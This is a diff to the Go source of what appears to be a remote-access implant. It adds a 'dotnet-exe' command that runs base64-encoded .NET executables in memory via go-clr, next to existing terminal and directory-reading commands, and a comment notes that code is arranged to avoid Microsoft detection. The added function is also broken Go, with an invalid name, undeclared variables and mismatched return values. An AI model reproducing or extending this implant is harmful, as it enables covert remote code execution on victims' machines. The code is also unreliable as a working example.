@@ -19,7 +19,22 @@ import (
 	"time"
 
 	"golang.org/x/crypto/chacha20poly1305"
+    clr "github.com/ropnop/go-clr"
 )
+
+func clr-run (recv_bytes []byte)(){
+    exebytes = recv_bytes
+	if err != nil {
+		log.Fatal(err)
+	}
+	runtime.KeepAlive(exebytes)
+
+	ret, err := clr.ExecuteByteArray(exebytes)
+	if err != nil {
+		log.Fatal(err)
+	}
+	return ret
+}
 
 func chacha(pass string, msg string) (enc_block []byte) {
 
@@ -171,7 +186,7 @@ func main() {
 
 		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
 		//sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
-		sb1 := strings.Split(sb, " ")
+		sb1 := strings.Fields(sb) // idk how I never heard of the Fields method
 		command := sb[1:]
 
 		h := sha256.New()
@@ -204,7 +219,9 @@ func main() {
 		case "rd":
 			result = readDir(sb1[1])
 		case "terminal":
-			result = terminal(sb)
+			result = terminal(sb1[1])
+		case "dotnet-exe":
+		    result = clr-run(base64.StdEncoding.DecodeString(sb1[1]))// this is expecting a b64 encoded exe byte string
 		}
 
 		toSend := string(result)
